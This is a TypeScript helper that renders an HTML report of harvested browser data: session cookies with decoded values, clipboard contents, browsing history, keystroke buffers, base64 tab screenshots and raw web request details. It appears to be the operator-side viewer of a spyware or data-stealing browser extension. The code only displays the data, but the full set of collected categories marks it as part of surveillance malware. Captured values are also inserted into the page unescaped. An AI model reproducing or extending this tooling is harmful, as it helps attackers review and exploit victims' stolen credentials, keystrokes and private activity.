import CookieDto from "../../repositories/DataTransferObjects/cookies.dto";
import BulkRetrieveDto from "../../repositories/DataTransferObjects/bulkRetriever.dto";
import ClipboardDto from "../../repositories/DataTransferObjects/clipboard.dto";
import HistoryDto from "../../repositories/DataTransferObjects/history.dto";
import KeystrokeDto from "../../repositories/DataTransferObjects/keystrokes.dto";
import TabCaptureDto from "../../repositories/DataTransferObjects/tabCapture.dto";
import WebRequestDto from "../../repositories/DataTransferObjects/webRequest.dto";

const fs = require('fs');

const buildHTML = async (bulkInfo: BulkRetrieveDto): Promise<string> => {
    return `
        <style>
            ${await getStyles()}
        </style>
        <h2>Cookies</h2>
        ${cookieTable(bulkInfo.digestable.cookies)}
        <h2>Clipboard</h2>
        ${clipboardTable(bulkInfo.digestable.clipboard)}
        <h2>History</h2>
        ${historyTable(bulkInfo.digestable.history)}
        <h2>Keystrokes</h2>
        ${keystrokeTable(bulkInfo.digestable.keystrokes)}
        <h2>Tab Captures</h2>
        ${images(bulkInfo.tabCatures)}
        <h2>Web Requests</h2>
        ${webRequests(bulkInfo.webRequests)}
    `;
}

const getStyles = async (): Promise<string> => {
    return new Promise((resolve, _) => {
        fs.readFile('./src/helpers/httpBuilder/style.css', 'utf8', (err: Error, data: string) => {
            if (err) {
              resolve("");
              return;
            }
            resolve(data);
        });
    });
};

const cookieTable = (cookieData: CookieDto[]) => {
    return `
        <table>
            <thead>
                <tr>
                    <th>URL</th>
                    <th>Cookie Name</th>
                    <th>Cookie Value</th>
                <tr>
            <tbody>
                ${getCookieRows(cookieData)}
            </tbody>
        </table>
    `
}

const getCookieRows = (cookieData: CookieDto[]) => {
    const html = cookieData.map((cookies) => {
        return `<tr><td>${cookies.url}</td><td>${cookies.cookieName}</td><td>${decodeURI(cookies.cookieValue)}</td></tr>`;
    });
    return html.join('');
};

const clipboardTable = (clipboardData: ClipboardDto[]) => {
    return `
        <table>
            <thead>
                <tr>
                    <th>DateTime</th>
                    <th>Clipboard Data</th>
                <tr>
            <tbody>
                ${getClipboardRows(clipboardData)}
            </tbody>
        </table>
    `
}

const getClipboardRows = (clipboardData: ClipboardDto[]) => {
    const html = clipboardData.map((clipboardData) => {
        return `<tr><td>${clipboardData.dateTime.toISOString()}</td><td>${decodeURI(clipboardData.data)}</td></tr>`;
    });
    return html.join('');
};

const historyTable = (historyData: HistoryDto[]) => {
    return `
        <table>
            <thead>
                <tr>
                    <th>DateTime</th>
                    <th>URL</th>
                <tr>
            <tbody>
                ${getHistoryRows(historyData)}
            </tbody>
        </table>
    `
}

const getHistoryRows = (historyData: HistoryDto[]) => {
    const html = historyData.map((historyData) => {
        return `<tr><td>${historyData.dateTime.toISOString()}</td><td>${decodeURI(historyData.url)}</td></tr>`;
    });
    return html.join('');
};

const keystrokeTable = (keystrokeData: KeystrokeDto[]) => {
    return `
        <table>
            <thead>
                <tr>
                    <th>DateTime</th>
                    <th>Buffer</th>
                <tr>
            <tbody>
                ${getKeystrokeRows(keystrokeData)}
            </tbody>
        </table>
    `
}

const getKeystrokeRows = (keystrokeData: KeystrokeDto[]) => {
    const html = keystrokeData.map((keystrokeData) => {
        return `<tr><td>${keystrokeData.dateTime.toISOString()}</td><td>${decodeURI(keystrokeData.buffer)}</td></tr>`;
    });
    return html.join('');
};

const images = (tabCaptures: TabCaptureDto[]) => {
    const html = tabCaptures.map((capture) => {
        const b64 = Buffer.from(capture.capture).toString('base64')
        const mimeType = 'image/jpeg';
        return `<img height="300px" src="data:${mimeType};base64,${b64}" />`
    });
    return html.join('');
};

const webRequests = (webRequests: WebRequestDto[]) => {
    const html = webRequests.map((webRequest) => {
        const details = Buffer.from(webRequest.requestInfo).toString('utf-8');
        return `<p>${details}</p><br>`;
    });
    return html.join('')
};

export default buildHTML;
